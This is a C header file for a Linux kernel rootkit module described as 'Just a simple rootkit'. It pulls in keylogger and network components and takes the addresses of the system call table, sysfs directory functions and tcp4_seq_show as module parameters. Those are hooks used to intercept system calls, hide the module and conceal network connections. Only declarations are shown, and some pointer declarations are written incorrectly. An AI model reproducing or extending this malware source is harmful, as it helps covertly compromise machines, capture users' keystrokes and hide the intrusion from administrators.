#ifndef ROOTKIT_H
#define ROOTKIT_H
#include <linux/moduleparam.h>
#include "keylogger.h"
#include "proc.h"
#include "file.h"
//#include "fops.h"
#include "module.h"
#include "network.h"
char * sys_call_table_addr_str, sysfs_remove_dir_addr_str, sysfs_create_dir_ns_addr_str, tcp4_seq_show_addr_str;
unsigned long * sys_call_table_addr, sysfs_remove_dir_addr, sysfs_create_dir_ns_addr, tcp4_seq_show_addr;
module_param(sys_call_table_addr_str, char*, 0);
module_param(sysfs_remove_dir_addr_str, char*, 0);
module_param(sysfs_create_dir_ns_addr_str, char*, 0);
module_param(tcp4_seq_show_addr_str, char*, 0);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheH");
MODULE_VERSION("2.0");
MODULE_DESCRIPTION("Just a simple rootkit");
MODULE_SUPPORTED_DEVICE("Not machine dependent");
static int __init start_rootkit(void);
static void __exit remove_rootkit(void);
bool check_parms(void);
void hundle_parms(void);
#endif